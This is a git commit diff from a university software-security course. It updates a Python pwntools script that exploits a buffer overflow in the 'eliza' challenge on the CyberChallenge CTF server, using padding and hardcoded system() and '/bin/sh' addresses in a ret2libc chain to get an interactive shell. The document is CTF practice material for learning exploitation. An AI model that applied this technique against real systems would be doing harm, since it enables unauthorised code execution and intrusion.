47e7b134c226ca7d5fdcdf2f5c94fa84f9f57230
MMola@unibz.it <massimiliano.mola@student.unibz.it>
2024-03-21 12:44:23 +0100

    aba

--- software-security/sw-3/eliza/eliza.py
+++ software-security/sw-3/eliza/eliza.py
@@ -2,9 +2,18 @@ from pwn import *
 
 BIN_SH = 0x7ffff7f6304f
 SYSTEM = 0x7ffff7e19920
+context.log_level = 'debug'
 
-r = remote()
-r.sendlineafter(
-    b'Ask me anything...\n', 
-    b'\n'
+r = remote('eliza.challs.cyberchallenge.it', 9131)
+r.sendlineafter(b'Ask me anything...\n', b'A' * (0x50+8))
+
+r.recv()
+r.sendline(
+    b'\n' * (0x50 + 8 * 2) +
+    p64(SYSTEM) +
+    b'A' * 8 +
+    p64(BIN_SH)
 )
+r.sendline( b'a' * (0x50 + 8 * 2) )
+
+r.interactive()
